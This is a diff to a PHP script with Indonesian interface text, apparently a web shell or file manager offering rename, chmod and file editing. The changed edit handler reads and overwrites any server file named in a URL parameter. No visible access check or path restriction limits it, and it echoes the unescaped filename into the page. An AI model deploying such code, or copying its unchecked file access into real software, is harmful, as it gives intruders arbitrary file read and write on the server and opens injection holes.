@@ -52,14 +52,27 @@ if (isset($_POST['rename_old'], $_POST['rename_new'])) {
 }
 if (isset($_GET['edit']) && is_file($_GET['edit'])) {
     $fileToEdit = $_GET['edit'];
-    if (isset($_POST['file_content'])) {
-        file_put_contents($fileToEdit, $_POST['file_content']);
-        header("Location: " . $_SERVER['PHP_SELF']);
-        exit;
-    }
-    $content = htmlspecialchars(file_get_contents($fileToEdit));
+
     echo "<h2>Editing: $fileToEdit</h2>";
-    echo "<form method='post'><textarea name='file_content' rows='20' style='width:100%'>$content</textarea><br><button type='submit'>Save</button></form>";
+
+    if (isset($_POST['file_content'])) {
+        if (is_writable($fileToEdit)) {
+            if (file_put_contents($fileToEdit, $_POST['file_content']) !== false) {
+                echo "<div style='color:lightgreen; margin-bottom:10px;'>✅ File berhasil disimpan.</div>";
+            } else {
+                echo "<div style='color:red; margin-bottom:10px;'>❌ Gagal menyimpan file (write error).</div>";
+            }
+        } else {
+            echo "<div style='color:red; margin-bottom:10px;'>❌ File tidak bisa ditulis (permission denied).</div>";
+        }
+    }
+
+    $content = htmlspecialchars(@file_get_contents($fileToEdit));
+    echo "<form method='post'>
+        <textarea name='file_content' rows='20' style='width:100%;font-family:monospace;'>$content</textarea><br>
+        <button type='submit' style='margin-top:10px;'>Save</button>
+    </form>
+    <div style='margin-top:10px;'><a href='".$_SERVER['PHP_SELF']."' style='color:#4ea8ff;'>← Kembali</a></div>";
     exit;
 }
 if (isset($_POST['chmod_target'], $_POST['chmod_value'])) {
